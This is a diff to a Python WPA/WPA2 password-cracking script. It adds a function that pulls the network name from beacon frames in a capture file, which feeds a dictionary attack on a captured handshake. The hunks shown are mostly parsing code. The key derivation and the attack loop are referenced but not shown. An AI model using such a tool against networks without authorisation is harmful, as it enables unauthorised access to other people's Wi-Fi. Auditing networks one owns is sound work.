@@ -2,7 +2,7 @@ import hashlib
 import hmac
 import struct
 import argparse
-from scapy.all import rdpcap
+from scapy.all import rdpcap, Dot11Beacon
 import time
 
 # PBKDF2-HMAC-SHA1 function for WPA/WPA2 key derivation
@@ -73,6 +73,20 @@ def parse_handshake(handshake_file):
             break
     return handshake
 
+# Extract SSID from Dot11Beacon
+def extract_ssid(handshake_file):
+    """
+    Try to extract the SSID from the .cap file by looking at beacon frames.
+    """
+    packets = rdpcap(handshake_file)
+    ssid = None
+    for packet in packets:
+        if packet.haslayer(Dot11Beacon):
+            ssid = packet[Dot11Beacon].info.decode('utf-8', errors='ignore')
+            if ssid:
+                return ssid
+    return None
+
 # Main function to handle the attack flow
 def main():
     parser = argparse.ArgumentParser(description="WPA password recovery tool")
@@ -95,28 +109,13 @@ def main():
         print("No handshake found in the .cap file.")
         return
 
-    # Print out the structure of the handshake to help find the SSID
-    print("Packet structure of the handshake:")
-    handshake.show()
+    # Extract SSID (network name) from the .cap file (look for beacon frames)
+    ssid = extract_ssid(args.handshake_file)
+    if not ssid:
+        print("SSID not found in beacon frames.")
+        return
 
-    # Extract SSID (network name) from the handshake
-    try:
-        # Attempt to extract SSID
-        ssid = handshake.info.decode('utf-8')  # This might need adjustment based on packet structure
-        print(f"SSID: {ssid}")
-    except AttributeError:
-        print("SSID not found in 'info' field. Attempting alternative extraction methods.")
-        # If no 'info' field, check for other potential places for SSID in the packet
-        ssid = None
-        # You can try extracting the SSID based on other fields or layers if necessary
-        for packet in rdpcap(args.handshake_file):
-            if packet.haslayer('Dot11Beacon'):
-                ssid = packet[Dot11Beacon].info.decode('utf-8', errors='ignore')
-                print(f"SSID found in Dot11Beacon: {ssid}")
-                break
-        if not ssid:
-            print("Could not extract SSID.")
-            return
+    print(f"SSID: {ssid}")
 
     # Start dictionary attack
     password = dictionary_attack(args.wordlist, handshake, ssid)
